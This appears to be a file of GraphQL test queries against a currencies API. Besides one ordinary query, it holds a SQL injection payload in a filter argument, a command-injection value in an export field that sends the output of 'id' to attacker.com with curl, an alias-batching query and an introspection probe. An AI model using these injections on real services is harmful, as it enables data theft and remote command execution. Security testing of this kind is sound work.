query.query:
query {
  getCurrencies {
    id
    abbreviation
    symbol
    rate
    country
  }
}

query {
  getCurrencies(filter: "1' UNION SELECT null,CONCAT(abbreviation,0x3a,symbol),null,null FROM currencies--") {
    id
    abbreviation
  }
}

query {
  getCurrencies(exportFormat: "csv; curl http://attacker.com/$(id)") {
    id
    country
  }
}

query {
  c1: getCurrencies {
    id
  }
  c2: getCurrencies {
    abbreviation
  }
}

query Introspection {
  getCurrencies {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        type { name kind }
      }
    }
  }
}
